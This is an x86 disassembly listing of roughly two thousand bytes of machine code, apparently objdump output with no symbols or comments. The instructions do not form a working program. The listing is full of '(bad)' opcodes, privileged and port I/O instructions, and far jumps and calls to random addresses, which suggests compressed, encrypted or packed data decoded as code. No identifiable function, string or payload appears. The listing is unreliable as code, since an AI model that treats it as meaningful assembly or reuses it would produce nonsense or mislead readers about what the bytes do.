  40e3c0:	sbb    DWORD PTR [eax+ebx*1+0x6a],0xfffffffd
  40e3c5:	imul   DWORD PTR [ecx]
  40e3c7:	or     ah,cl
  40e3c9:	aaa    
  40e3ca:	jnp    0x40e413
  40e3cc:	inc    edx
  40e3cd:	js     0x40e3b1
  40e3cf:	fisttp WORD PTR [ebx-0x7e]
  40e3d2:	in     eax,0xfb
  40e3d4:	cmp    DWORD PTR [ebp-0x6505073b],0x800bf758
  40e3de:	call   FWORD PTR [ebx+0x3bba492d]
  40e3e4:	dec    edi
  40e3e5:	inc    ebp
  40e3e6:	out    0xb9,al
  40e3e8:	or     al,0x5c
  40e3ea:	pop    edx
  40e3eb:	jge    0x40e381
  40e3ed:	fist   WORD PTR [edx-0x4fea55a4]
  40e3f3:	sub    BYTE PTR [eax+0x67109a9d],ah
  40e3f9:	xor    eax,0x136628a5
  40e3fe:	test   eax,0xda98837f
  40e403:	cmp    al,BYTE PTR [ebx-0x5734b5cc]
  40e409:	clc    
  40e40a:	lahf   
  40e40b:	test   eax,0xd8993d04
  40e410:	adc    cl,bl
  40e412:	dec    ebp
  40e413:	sub    eax,0x6f9b108b
  40e418:	scas   al,BYTE PTR es:[edi]
  40e419:	ja     0x40e486
  40e41b:	xor    al,0xbd
  40e41d:	jmp    0x985fd38d
  40e422:	nop
  40e423:	lods   eax,DWORD PTR ds:[esi]
  40e424:	lahf   
  40e425:	icebp  
  40e426:	cli    
  40e427:	push   ss
  40e428:	inc    esp
  40e429:	jle    0x40e456
  40e42b:	shr    DWORD PTR [ebx-0x16],cl
  40e42e:	xor    dh,dl
  40e430:	outs   dx,BYTE PTR ds:[esi]
  40e431:	xor    DWORD PTR [edi-0x7e44fe71],ebp
  40e437:	mov    bh,BYTE PTR [eax]
  40e439:	jg     0x40e452
  40e43b:	xor    al,bh
  40e43d:	aaa    
  40e43e:	in     eax,dx
  40e43f:	xchg   ebx,eax
  40e440:	in     eax,0x61
  40e442:	ret    
  40e443:	xchg   esi,eax
  40e444:	sbb    dh,0x1b
  40e447:	mov    ebp,0xa0eed587
  40e44c:	push   ecx
  40e44d:	stos   BYTE PTR es:[edi],al
  40e44e:	and    BYTE PTR [edx+0x395a6f31],ah
  40e454:	retf   0xe0b2
  40e457:	mov    ebx,0xa438d6b5
  40e45c:	call   0xa2d80a24
  40e461:	sar    DWORD PTR [ebx+0x4e],1
  40e464:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e465:	outs   dx,BYTE PTR ds:[esi]
  40e466:	pop    es
  40e467:	hlt    
  40e468:	inc    esp
  40e469:	dec    ebx
  40e46a:	gs dec ecx
  40e46c:	out    0xd9,eax
  40e46e:	inc    edx
  40e46f:	dec    esp
  40e470:	jb     0x40e43d
  40e472:	mov    BYTE PTR [ebx],al
  40e474:	ins    DWORD PTR es:[edi],dx
  40e475:	mov    esp,0x1ecd9e90
  40e47a:	dec    ebp
  40e47b:	shl    esp,cl
  40e47d:	xor    ecx,DWORD PTR [esi+0x3b]
  40e480:	fld    DWORD PTR [esi+0x77]
  40e483:	fdivr  QWORD PTR ss:0x7a9ccfc6
  40e48a:	stos   DWORD PTR es:[edi],eax
  40e48b:	sub    esi,edi
  40e48d:	(bad)  
  40e48e:	add    DWORD PTR [ebx-0x405532bb],esi
  40e494:	cmp    DWORD PTR [esi+0x707d21ec],edi
  40e49a:	mov    ds:0x63945480,eax
  40e49f:	lods   al,BYTE PTR ds:[esi]
  40e4a0:	or     DWORD PTR [ebx-0x50],ebp
  40e4a3:	mov    ch,0xd0
  40e4a5:	xchg   ebx,eax
  40e4a6:	sub    dh,BYTE PTR [edi+0x772bd0b8]
  40e4ac:	retf   0xb7df
  40e4af:	dec    ebx
  40e4b0:	frstpm(287 only) 
  40e4b2:	pop    eax
  40e4b3:	cdq    
  40e4b4:	mov    ?,WORD PTR [ecx+0x5d]
  40e4b7:	pop    edx
  40e4b8:	ss int 0xd2
  40e4bb:	imul   eax,DWORD PTR [ebp-0x51],0xfe734ef0
  40e4c2:	lds    esi,FWORD PTR [edi+ebx*8]
  40e4c5:	or     al,0x55
  40e4c7:	(bad)  
  40e4c8:	(bad)  
  40e4ca:	cmp    eax,0x765f3fe8
  40e4cf:	out    dx,eax
  40e4d0:	out    0x5f,eax
  40e4d2:	push   es
  40e4d3:	imul   edx,ecx,0xffffff91
  40e4d6:	into   
  40e4d7:	pop    eax
  40e4d8:	mov    al,0x0
  40e4da:	aam    0x7d
  40e4dc:	jne    0x40e4db
  40e4de:	daa    
  40e4df:	(bad)  
  40e4e0:	(bad)  
  40e4e1:	nop
  40e4e2:	das    
  40e4e3:	push   0xce3e7a6f
  40e4e8:	es cli 
  40e4ea:	dec    ecx
  40e4eb:	jnp    0x40e4c9
  40e4ed:	lahf   
  40e4ee:	rol    BYTE PTR [eax],cl
  40e4f0:	ins    BYTE PTR es:[edi],dx
  40e4f1:	add    DWORD PTR [ebx+eiz*2],0x49
  40e4f5:	push   ecx
  40e4f6:	xchg   ecx,eax
  40e4f7:	scas   eax,DWORD PTR es:[edi]
  40e4f8:	mov    ds:0x2aa7b0af,eax
  40e4fd:	fwait
  40e4fe:	iret   
  40e4ff:	sar    ch,0x2a
  40e502:	mov    ebx,0xa6640679
  40e507:	xor    dh,BYTE PTR [edi-0x28]
  40e50a:	leave  
  40e50b:	push   0x6719f2a6
  40e510:	dec    ebp
  40e511:	add    ah,BYTE PTR [ecx+0xb43ab9]
  40e517:	mov    ch,0x1a
  40e519:	pop    ebx
  40e51a:	xchg   edi,eax
  40e51b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e51c:	or     BYTE PTR [esi-0x66],al
  40e51f:	sbb    ebx,edx
  40e521:	pop    edi
  40e522:	stos   DWORD PTR es:[edi],eax
  40e523:	jge    0x40e584
  40e525:	mov    eax,0x336e106d
  40e52a:	jbe    0x2c5f33ec
  40e530:	or     dl,BYTE PTR [edi]
  40e532:	scas   al,BYTE PTR es:[edi]
  40e533:	mov    esp,0xac94dc10
  40e538:	xor    eax,0x67d0f7d7
  40e53d:	push   edx
  40e53e:	push   edx
  40e53f:	or     DWORD PTR ds:0x5595b0d,ebp
  40e545:	cs aaa 
  40e547:	mov    eax,ds:0xbb3e4a17
  40e54c:	mov    ds:0x2da2be20,eax
  40e551:	mov    bh,0x7f
  40e553:	add    ebx,esp
  40e555:	cmp    BYTE PTR [eax+0x2f],dl
  40e558:	outs   dx,DWORD PTR ds:[esi]
  40e559:	pop    edx
  40e55a:	repz stc 
  40e55c:	xchg   edx,edx
  40e55e:	dec    ebp
  40e55f:	iret   
  40e560:	adc    BYTE PTR [esi-0x23],0x51
  40e564:	ret    0xe1fb
  40e567:	pop    eax
  40e568:	jl     0x40e548
  40e56a:	inc    edx
  40e56b:	push   cs
  40e56c:	je     0x40e5d2
  40e56e:	sbb    eax,0x3e77044b
  40e573:	(bad)  
  40e574:	and    esp,DWORD PTR [ebx+0x75]
  40e577:	mov    eax,0xb62a4f1c
  40e57c:	cmc    
  40e57d:	sbb    DWORD PTR [esi+0x50],edi
  40e580:	inc    BYTE PTR [edi+0x77]
  40e583:	jmp    0x58b93de5
  40e588:	mov    al,0x23
  40e58a:	or     BYTE PTR [edi],dh
  40e58c:	or     BYTE PTR [ebp+0x3e],ch
  40e58f:	or     esp,edx
  40e591:	lods   al,BYTE PTR ds:[esi]
  40e592:	fistp  DWORD PTR [edx+0x7096cee]
  40e598:	(bad)  
  40e599:	imul   ebx,ebx,0xcc6108ae
  40e59f:	out    dx,al
  40e5a0:	jnp    0x40e5b6
  40e5a2:	test   DWORD PTR [ecx+edx*4],esp
  40e5a5:	iret   
  40e5a6:	ja     0x40e57b
  40e5a8:	(bad)  [edx-0x3a3f9e8]
  40e5ae:	outs   dx,DWORD PTR ds:[esi]
  40e5af:	pop    esi
  40e5b0:	mov    esi,DWORD PTR fs:[ecx]
  40e5b3:	jae    0x40e601
  40e5b5:	and    DWORD PTR ds:0x933dec67,esp
  40e5bb:	cmovnp esp,DWORD PTR [edx+ecx*2+0x55750cf2]
  40e5c3:	push   ss
  40e5c4:	imul   bh
  40e5c6:	mov    dl,0x99
  40e5c8:	inc    edx
  40e5c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5ca:	ins    DWORD PTR es:[edi],dx
  40e5cb:	aam    0xe0
  40e5cd:	fmul   st(1),st
  40e5cf:	push   edi
  40e5d0:	call   0x725016a3
  40e5d5:	pop    ss
  40e5d6:	loopne 0x40e639
  40e5d8:	outs   dx,BYTE PTR ds:[esi]
  40e5d9:	sti    
  40e5da:	lods   al,BYTE PTR ds:[esi]
  40e5db:	dec    eax
  40e5dc:	pop    ebp
  40e5dd:	(bad)  
  40e5de:	out    dx,eax
  40e5df:	xor    eax,0x52be41d
  40e5e4:	pop    ecx
  40e5e5:	xor    eax,0xd8600ad0
  40e5ea:	stos   BYTE PTR es:[edi],al
  40e5eb:	(bad)  
  40e5ec:	pop    ds
  40e5ed:	pop    ebx
  40e5ee:	inc    edi
  40e5ef:	cmp    al,0xd3
  40e5f1:	not    BYTE PTR [ebp+0x2f8b4fab]
  40e5f7:	add    ch,bl
  40e5f9:	jg     0x40e634
  40e5fb:	jmp    0x40e64b
  40e5fd:	mov    esi,DWORD PTR [eax-0x45]
  40e600:	fbld   TBYTE PTR [esi+esi*2-0x79fffc0]
  40e607:	stos   DWORD PTR es:[edi],eax
  40e608:	mov    eax,ds:0xe4426b2b
  40e60d:	retf   0x6f3b
  40e610:	retf   0x76b9
  40e613:	adc    eax,0x5063bd3
  40e618:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e619:	scas   al,BYTE PTR es:[edi]
  40e61a:	loopne 0x40e5c1
  40e61c:	adc    esp,DWORD PTR ds:[eax-0x1aca10cc]
  40e623:	mov    eax,ds:0x3e4d8f6b
  40e628:	push   0x42
  40e62a:	retf   0xdab3
  40e62d:	mov    al,ds:0x73a79979
  40e632:	xor    ecx,DWORD PTR [ebx]
  40e634:	lahf   
  40e635:	dec    edi
  40e636:	test   BYTE PTR [esi-0x6],ch
  40e639:	imul   edi,esp,0x79c1a26
  40e63f:	and    eax,0x9980a0
  40e644:	xor    al,0xfc
  40e646:	jmp    0xc8ec6238
  40e64b:	mov    dl,BYTE PTR [eax]
  40e64d:	cs bnd jmp 0xb729818f
  40e654:	scas   eax,DWORD PTR es:[edi]
  40e655:	adc    ch,0xab
  40e658:	cmp    BYTE PTR ds:0x100e347d,ch
  40e65e:	div    BYTE PTR [edi+0x1e]
  40e661:	in     al,0xf7
  40e663:	jb     0x40e6e2
  40e665:	sbb    eax,0x436eb596
  40e66a:	(bad)
  40e66e:	retf   
  40e66f:	icebp  
  40e670:	mov    ecx,0xfac3d695
  40e675:	test   esp,0x47d1d829
  40e67b:	pop    eax
  40e67c:	pop    ecx
  40e67d:	bound  ebx,QWORD PTR [ecx-0x9557e99]
  40e683:	xchg   edx,eax
  40e684:	test   BYTE PTR [ebx+0x33db0a7f],0xee
  40e68b:	jmp    0xa3ee:0x2ac7d270
  40e692:	jmp    0xd692378f
  40e697:	jns    0x40e6ea
  40e699:	cmp    eax,0x1d32e3d3
  40e69e:	test   al,0xc4
  40e6a0:	inc    ebx
  40e6a1:	lods   al,BYTE PTR ds:[esi]
  40e6a2:	repz idiv BYTE PTR [eax-0x34]
  40e6a6:	jae    0x40e6d7
  40e6a8:	push   ds
  40e6a9:	loopne 0x40e674
  40e6ab:	pushf  
  40e6ac:	mov    ah,BYTE PTR [ecx]
  40e6ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6af:	xchg   edx,eax
  40e6b0:	(bad)  
  40e6b1:	jmp    eax
  40e6b3:	call   0x5680:0x1e8fce1d
  40e6ba:	ror    bl,1
  40e6bc:	enter  0x3a8a,0x40
  40e6c0:	adc    BYTE PTR [esi-0x30410648],cl
  40e6c6:	xlat   BYTE PTR ds:[ebx]
  40e6c7:	mov    esi,0x9b19e6de
  40e6cc:	xor    BYTE PTR [edi],ah
  40e6ce:	dec    ecx
  40e6cf:	jb     0x40e719
  40e6d1:	pop    esi
  40e6d2:	add    esi,DWORD PTR [ebp+0x794d203c]
  40e6d8:	push   esp
  40e6d9:	xchg   edi,eax
  40e6da:	sahf   
  40e6db:	mov    eax,ds:0x88c663d7
  40e6e0:	mov    ecx,0x3ed2ed46
  40e6e5:	cmp    al,0xd3
  40e6e7:	es dec edx
  40e6e9:	test   al,0xde
  40e6eb:	lahf   
  40e6ec:	xchg   esi,eax
  40e6ed:	push   ss
  40e6ee:	outs   dx,BYTE PTR ds:[esi]
  40e6ef:	scas   al,BYTE PTR es:[edi]
  40e6f0:	retf   
  40e6f1:	mov    ah,0x37
  40e6f3:	lods   eax,DWORD PTR ds:[esi]
  40e6f4:	cdq    
  40e6f5:	push   0xffffff9b
  40e6f7:	sub    ebp,edx
  40e6f9:	push   edi
  40e6fa:	and    BYTE PTR [ebx+edi*4-0x99c9253],cl
  40e701:	xchg   ecx,eax
  40e702:	loopne 0x40e704
  40e704:	mov    ebx,0x9e4bd88f
  40e709:	jge    0x40e6c2
  40e70b:	loop   0x40e70e
  40e70d:	scas   al,BYTE PTR es:[edi]
  40e70e:	xchg   ebp,eax
  40e70f:	inc    edi
  40e710:	mov    BYTE PTR ds:[edx-0x45f2c458],bh
  40e717:	ficomp DWORD PTR [ebx-0x43c61f4e]
  40e71d:	xchg   BYTE PTR [eax-0xb01a62f],dh
  40e723:	outs   dx,DWORD PTR ds:[esi]
  40e724:	(bad)
  40e728:	inc    esp
  40e729:	adc    cl,BYTE PTR [edx]
  40e72b:	dec    ebx
  40e72c:	pop    es
  40e72d:	jmp    0xcaab:0xc89a8d88
  40e734:	pop    ebp
  40e735:	repnz sub al,0xf2
  40e738:	sub    BYTE PTR [edx-0x1996226f],0x89
  40e73f:	adc    DWORD PTR [ecx+0x7e],esp
  40e742:	xor    BYTE PTR [esi+0x0],ah
  40e745:	cmp    dh,BYTE PTR [esi+eiz*2+0x1]
  40e749:	repnz iret 
  40e74b:	loopne 0x40e753
  40e74d:	(bad)  
  40e74e:	in     al,dx
  40e74f:	cdq    
  40e750:	test   al,0x6e
  40e752:	mov    cl,0xc2
  40e754:	jmp    0x4216:0x28d1119d
  40e75b:	pop    es
  40e75c:	je     0x40e73d
  40e75e:	fld    st(0)
  40e760:	jnp    0x40e7be
  40e762:	push   ss
  40e763:	pop    esi
  40e764:	std    
  40e765:	aas    
  40e766:	pop    eax
  40e767:	sub    DWORD PTR ds:0x42aca085,esp
  40e76d:	xchg   ebp,eax
  40e76e:	scas   eax,DWORD PTR es:[edi]
  40e76f:	mov    esi,0x125785ca
  40e774:	dec    eax
  40e775:	in     al,dx
  40e776:	repnz icebp 
  40e778:	and    edi,DWORD PTR [ebp-0x7c]
  40e77b:	(bad)  
  40e77c:	int    0x98
  40e77e:	fst    QWORD PTR [ebp-0x17]
  40e781:	pop    edi
  40e782:	fiadd  WORD PTR [ebx+ecx*1]
  40e785:	stc    
  40e786:	or     bl,bl
  40e788:	jl     0x40e751
  40e78a:	aam    0xb4
  40e78c:	into   
  40e78d:	nop
  40e78e:	lock cmp eax,0x4b449396
  40e795:	sbb    esp,DWORD PTR [eax-0x4d4a6353]
  40e79b:	adc    BYTE PTR [ebx],cl
  40e79d:	add    BYTE PTR [ecx+0x27a3eff2],dh
  40e7a3:	dec    ebp
  40e7a4:	daa    
  40e7a5:	mov    fs,WORD PTR [edi-0x4c]
  40e7a8:	ficomp WORD PTR [esi]
  40e7aa:	jne    0x40e7cc
  40e7ac:	ss aad 0x33
  40e7af:	test   BYTE PTR [esi+0x3452aab4],al
  40e7b5:	and    al,0x7
  40e7b7:	jnp    0x40e7c4
  40e7b9:	gs and al,0x3f
  40e7bc:	fsub   DWORD PTR [edx]
  40e7be:	mov    edi,0x76cbf83c
  40e7c3:	stos   BYTE PTR es:[edi],al
  40e7c4:	pop    ds
  40e7c5:	dec    eax
  40e7c6:	gs push 0x9727e116
  40e7cc:	nop
  40e7cd:	lds    ecx,FWORD PTR [ecx+0x4511921b]
  40e7d3:	sbb    ecx,DWORD PTR [ecx]
  40e7d5:	shl    esp,cl
  40e7d7:	dec    edx
  40e7d8:	dec    edi
  40e7d9:	shl    BYTE PTR [ebp+0x152ff950],cl
  40e7df:	dec    esi
  40e7e1:	nop
  40e7e2:	jno    0x40e7dc
  40e7e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7e5:	xchg   edx,eax
  40e7e6:	fild   QWORD PTR [ebx+ecx*8-0x7d58048a]
  40e7ed:	rcr    DWORD PTR [eax-0x37],cl
  40e7f0:	or     eax,0x2924b7d9
  40e7f5:	adc    al,0x37
  40e7f7:	(bad)  
  40e7f8:	call   0x6f2a:0x8b8c5a80
  40e7ff:	xchg   DWORD PTR [edx+0x70],esi
  40e802:	add    ah,BYTE PTR [edi+0x75]
  40e805:	or     esp,ecx
  40e807:	prefetch (bad)
  40e808:	or     eax,0x4daf99f3
  40e80d:	xor    ch,ah
  40e80f:	or     cl,BYTE PTR [esi-0x5d]
  40e812:	rol    esi,0xe2
  40e815:	rcr    esi,1
  40e817:	pmullw mm6,QWORD PTR [edi]
  40e81a:	mov    ecx,0x252b693d
  40e81f:	jne    0x40e7e6
  40e821:	xor    esi,DWORD PTR [edx+0x3eb3babe]
  40e827:	(bad)  
  40e828:	fist   WORD PTR [edi+0x2c]
  40e82b:	or     eax,0xcbfa6eec
  40e830:	xor    al,0xb
  40e832:	and    eax,0xee4686ad
  40e837:	pop    ds
  40e838:	out    0x7c,al
  40e83a:	mov    ebx,DWORD PTR [eax+ebx*8-0x577676d6]
  40e841:	mov    ecx,0x43b87074
  40e846:	cmp    ah,bl
  40e848:	mov    ds:0x378a273a,al
  40e84d:	ret    0x71fa
  40e850:	push   edi
  40e851:	bound  esp,QWORD PTR [ebx]
  40e853:	mov    dl,0x3
  40e855:	xchg   edi,eax
  40e856:	dec    ebp
  40e857:	add    eax,0xfa66aa40
  40e85c:	aaa    
  40e85d:	cmp    dh,ch
  40e85f:	cmp    BYTE PTR [eax+0xbf7feed],dl
  40e865:	pop    eax
  40e866:	dec    edx
  40e867:	adc    BYTE PTR [ecx-0x72],dl
  40e86a:	(bad)  
  40e86b:	pop    esi
  40e86c:	dec    edx
  40e86d:	xchg   esp,eax
  40e86e:	stc    
  40e86f:	xchg   edi,eax
  40e870:	push   cs
  40e871:	jbe    0x40e8d6
  40e873:	xchg   esi,eax
  40e874:	pop    edi
  40e875:	clc    
  40e876:	cld    
  40e877:	mov    esp,0x691100f2
  40e87c:	out    dx,al
  40e87d:	pop    edi
  40e87e:	and    eax,0x69183e9d
  40e883:	jmp    0x9ab45e51
  40e888:	mov    ebp,0xc877c108
  40e88d:	jmp    0x4d24:0x13df7029
  40e894:	push   eax
  40e895:	or     eax,0x101f4756
  40e89a:	imul   edx,DWORD PTR [eax-0x7ac7652d],0x7b
  40e8a1:	outs   dx,DWORD PTR gs:[esi]
  40e8a3:	mov    ecx,esi
  40e8a5:	xor    DWORD PTR [ebp+0x6d],edx
  40e8a8:	repz xor al,0xdb
  40e8ab:	adc    BYTE PTR [ebx-0x77],ah
  40e8ae:	xor    al,BYTE PTR [eax+esi*2]
  40e8b1:	sar    BYTE PTR [edx],0xac
  40e8b4:	stos   DWORD PTR es:[edi],eax
  40e8b5:	fdiv   st,st(2)
  40e8b7:	mov    al,ds:0xcdef413c
  40e8bc:	xor    al,0xf3
  40e8be:	scas   eax,DWORD PTR es:[edi]
  40e8bf:	in     eax,0x47
  40e8c1:	repz iret 
  40e8c3:	jns    0x40e8ed
  40e8c5:	jnp    0x40e8ca
  40e8c7:	mov    bh,0x13
  40e8c9:	stos   BYTE PTR es:[edi],al
  40e8ca:	push   esp
  40e8cb:	mov    dl,bl
  40e8cd:	fwait
  40e8ce:	push   ebp
  40e8cf:	cmp    dh,bh
  40e8d1:	daa    
  40e8d2:	inc    ebp
  40e8d3:	cs mov al,0x5e
  40e8d6:	dec    ebp
  40e8d7:	sub    al,dh
  40e8d9:	int3   
  40e8da:	cli    
  40e8db:	(bad)  
  40e8dc:	fadd   st,st(0)
  40e8de:	mov    eax,ds:0x483c90de
  40e8e3:	aas    
  40e8e4:	jb     0x40e93c
  40e8e6:	pop    ebp
  40e8e7:	cld    
  40e8e8:	and    ebx,DWORD PTR [edi-0x36]
  40e8eb:	or     eax,0x4b818ba6
  40e8f0:	div    BYTE PTR [ebp+0x2d]
  40e8f3:	bound  esp,QWORD PTR [ebp-0x4a0eda5b]
  40e8f9:	sub    eax,0x57a20684
  40e8fe:	dec    edx
  40e8ff:	dec    ecx
  40e900:	pop    eax
  40e901:	and    esp,DWORD PTR [ecx-0x4402d32a]
  40e907:	mov    eax,ds:0xdcc70da4
  40e90c:	dec    esp
  40e90d:	or     edi,DWORD PTR [edx]
  40e90f:	xlat   BYTE PTR ds:[ebx]
  40e910:	lock jle 0x40e97e
  40e913:	mov    ecx,0x9cafeec8
  40e918:	sub    cl,BYTE PTR [ecx+ecx*2+0x2584a548]
  40e91f:	push   cs
  40e920:	ja     0x40e8f5
  40e922:	sbb    ch,dl
  40e924:	add    BYTE PTR [ebx-0x1c],dh
  40e927:	mov    al,ds:0x5e99f7e2
  40e92c:	dec    edi
  40e92d:	xor    eax,0x54de10df
  40e932:	pop    ebp
  40e933:	xor    eax,0x39a7c9ce
  40e938:	out    0xa3,al
  40e93a:	jne    0x40e9b2
  40e93c:	in     al,0xcd
  40e93e:	sbb    eax,0xed0cb5e9
  40e943:	jne    0x40e96d
  40e945:	(bad)  
  40e946:	adc    al,0x38
  40e948:	mov    edx,0xbe97e9f7
  40e94d:	pop    ss
  40e94e:	imul   esp,DWORD PTR [edx-0x52fd0c83],0xd5fd46ff
  40e958:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e959:	and    edi,DWORD PTR [ebx]
  40e95b:	int    0xf2
  40e95d:	mov    esp,0xdcd2a306
  40e962:	lock xchg edx,eax
  40e964:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e965:	idiv   esp
  40e967:	aam    0xc3
  40e969:	xor    DWORD PTR [ebp+0x4a],ebp
  40e96c:	das    
  40e96d:	xchg   esi,eax
  40e96e:	retf   0xd190
  40e971:	ret    
  40e972:	(bad)  
  40e973:	mov    bh,0x49
  40e975:	push   0x78
  40e977:	xlat   BYTE PTR ds:[ebx]
  40e978:	mov    ecx,0x1e2fb513
  40e97d:	bound  edi,QWORD PTR [ebp-0x24]
  40e980:	sahf   
  40e981:	ins    DWORD PTR es:[edi],dx
  40e982:	ins    BYTE PTR es:[edi],dx
  40e983:	enter  0xb7,0x6c
  40e987:	es or  al,0x26
  40e98a:	ret    0xe9d3
  40e98d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e98e:	inc    edx
  40e98f:	int    0xc4
  40e991:	push   ss
  40e992:	test   BYTE PTR [edx+eiz*8-0x62],bh
  40e996:	sahf   
  40e997:	xlat   BYTE PTR ds:[ebx]
  40e998:	sahf   
  40e999:	int    0xd1
  40e99b:	pop    ebx
  40e99c:	jle    0x40ea06
  40e99e:	and    edi,edi
  40e9a0:	in     al,dx
  40e9a1:	test   DWORD PTR [edx+esi*2],0xe9eec47f
  40e9a8:	jnp    0x40ea1f
  40e9aa:	lods   eax,DWORD PTR ds:[esi]
  40e9ab:	fnstenv ds:0x12a72d6d
  40e9b1:	mov    ebp,0xa9cc0e71
  40e9b6:	cli    
  40e9b7:	test   BYTE PTR [ecx-0x7c],dh
  40e9ba:	shr    ebx,cl
  40e9bc:	and    DWORD PTR [ebp-0x21f9e8d8],eax
  40e9c2:	repz repz (bad) 
  40e9c6:	sbb    BYTE PTR [edx-0x61],0xb7
  40e9ca:	fadd   QWORD PTR [esi]
  40e9cc:	pop    ecx
  40e9cd:	js     0x40e955
  40e9cf:	adc    BYTE PTR [ebx+0xfbdb883],bh
  40e9d5:	shl    eax,0x50
  40e9d8:	stos   BYTE PTR es:[edi],al
  40e9d9:	fiadd  WORD PTR [edi+ecx*2]
  40e9dc:	int    0x61
  40e9de:	mov    edi,0x253d149f
  40e9e3:	mov    DWORD PTR [esp+ebp*8+0x5b],esi
  40e9e7:	lods   eax,DWORD PTR ds:[esi]
  40e9e8:	es jno 0x40e98a
  40e9eb:	mov    ds:0xbc726659,eax
  40e9f0:	pop    esp
  40e9f1:	mov    dh,ch
  40e9f3:	popa   
  40e9f4:	sbb    bh,0x21
  40e9f7:	dec    ebx
  40e9f8:	mov    ebp,0xb08c4947
  40e9fd:	fist   WORD PTR [ecx]
  40e9ff:	sub    BYTE PTR [edi+ebp*8],ch
  40ea02:	push   0x3e
  40ea04:	and    ebx,DWORD PTR [esi+0x1a]
  40ea07:	adc    al,0x6b
  40ea09:	sbb    ah,BYTE PTR [ebx-0x77735f2]
  40ea0f:	imul   edx,esp,0xffffffbf
  40ea12:	xchg   DWORD PTR [edx-0xd],ebx
  40ea15:	sti    
  40ea16:	mov    ecx,0x48fa0ff5
  40ea1b:	mov    ah,0x4e
  40ea1d:	jp     0x40e9fe
  40ea1f:	cmp    ebx,ebp
  40ea21:	sub    DWORD PTR [edi-0x7efb3d5d],0xee00ca2b
  40ea2b:	or     dl,0xc4
  40ea2e:	dec    edi
  40ea2f:	sbb    DWORD PTR [ecx+0x5fa4c697],0xcabb8a3e
  40ea39:	jae    0x40ea04
  40ea3b:	jnp    0x40e9ea
  40ea3d:	(bad)  
  40ea3e:	jecxz  0x40ea45
  40ea40:	mov    ch,0x9f
  40ea42:	add    dh,BYTE PTR [edi+0x5b]
  40ea45:	dec    ecx
  40ea46:	sbb    al,0xf
  40ea48:	and    BYTE PTR [ebp+eiz*1+0x67],bh
  40ea4c:	dec    eax
  40ea4d:	mov    BYTE PTR [edx],ah
  40ea4f:	(bad)  
  40ea50:	mov    ecx,0x8006c452
  40ea55:	push   ebp
  40ea56:	inc    eax
  40ea57:	sub    BYTE PTR [ebx-0x15],ch
  40ea5a:	jo     0x40ea9c
  40ea5c:	pop    esp
  40ea5d:	mov    ecx,0x838bb3de
  40ea62:	mov    ebp,0xbca93779
  40ea67:	xor    BYTE PTR [ecx+0x17],al
  40ea6a:	iret   
  40ea6b:	loop   0x40ead5
  40ea6d:	jp     0x40eae7
  40ea6f:	push   esp
  40ea70:	mov    al,ds:0x9b9ade9b
  40ea75:	push   esp
  40ea76:	outs   dx,DWORD PTR ds:[esi]
  40ea77:	and    dl,bl
  40ea79:	push   0x7e
  40ea7b:	mov    al,ds:0x57315d21
  40ea80:	call   0xee1a:0x9d3774ca
  40ea87:	call   0x8d7b:0xfa8cd698
  40ea8e:	mov    al,ds:0x7ccdb774
  40ea93:	pop    ecx
  40ea94:	aaa    
  40ea95:	push   edi
  40ea96:	mov    eax,ds:0xf2c4238d
  40ea9b:	dec    ebp
  40ea9c:	(bad)  
  40ea9d:	retf   
  40ea9e:	in     eax,0x33
  40eaa0:	stos   BYTE PTR es:[edi],al
  40eaa1:	popa   
  40eaa2:	mov    edi,0x3198314a
  40eaa7:	xchg   esp,eax
  40eaa8:	push   ebp
  40eaa9:	enter  0x6978,0xdf
  40eaad:	rol    DWORD PTR [edi],1
  40eaaf:	mov    ss:0x61cb33b3,eax
  40eab5:	xor    eax,0x3d59bcfa
  40eaba:	out    0x8,al
  40eabc:	mov    BYTE PTR [eax+0x2085bdf],dl
  40eac2:	xchg   ecx,eax
  40eac3:	push   ebp
  40eac4:	cmp    eax,0x53a57263
  40eac9:	das    
  40eaca:	push   0xffffffd8
  40eacc:	ss pop edx
  40eace:	xor    DWORD PTR [ecx+0x546c50c4],edi
  40ead4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ead5:	inc    esp
  40ead6:	ja     0x40ead4
  40ead8:	sahf   
  40ead9:	iret   
  40eada:	pop    esp
  40eadb:	adc    ah,dh
  40eadd:	inc    ebx
  40eade:	cdq    
  40eadf:	cmc    
  40eae0:	inc    edi
  40eae1:	dec    edi
  40eae2:	or     eax,0xf5758cf4
  40eae7:	dec    ecx
  40eae8:	adc    BYTE PTR [ecx+eax*4-0x30d25739],cl
  40eaef:	lock pop esi
  40eaf1:	out    dx,eax
  40eaf2:	ds ins BYTE PTR es:[edi],dx
  40eaf4:	sbb    al,0x27
  40eaf6:	xchg   ecx,eax
  40eaf7:	and    al,BYTE PTR [edi+0xfe1c834]
  40eafd:	in     eax,0x60
  40eaff:	inc    eax
  40eb00:	(bad)  
  40eb01:	mov    esi,0x67ca0607
  40eb06:	fwait
  40eb07:	lds    esp,FWORD PTR [edi]
  40eb09:	ret    0xd73e
  40eb0c:	xchg   esp,eax
  40eb0d:	pop    ss
  40eb0e:	add    dl,dh
  40eb10:	ret    0xc1da
  40eb13:	jle    0x40eb8f
  40eb15:	mov    ebp,0xd61baf5b
  40eb1a:	jne    0x40eafd
  40eb1c:	sub    BYTE PTR [edx-0xd2f0d67],al
  40eb22:	inc    esi
  40eb23:	pop    ds
  40eb24:	jecxz  0x40eb9f
  40eb26:	mov    DWORD PTR ds:0x9c5fad96,ebp
  40eb2c:	jp     0x40eb64
  40eb2e:	imul   eax,DWORD PTR [ebx+0x76],0x31
  40eb32:	or     BYTE PTR [ebx+0x4a],al
  40eb35:	mov    ch,0xc4
  40eb37:	push   edx
  40eb38:	rcr    BYTE PTR [ebp+ecx*4-0x1a],cl
  40eb3c:	iret   
  40eb3d:	hlt    
  40eb3e:	dec    BYTE PTR ds:0x41c38fb
  40eb44:	(bad)  
  40eb46:	and    al,0x60
  40eb48:	mov    ch,0xf2
  40eb4a:	pop    esi
  40eb4b:	sub    DWORD PTR [ebx-0x3e],0x1811e40b
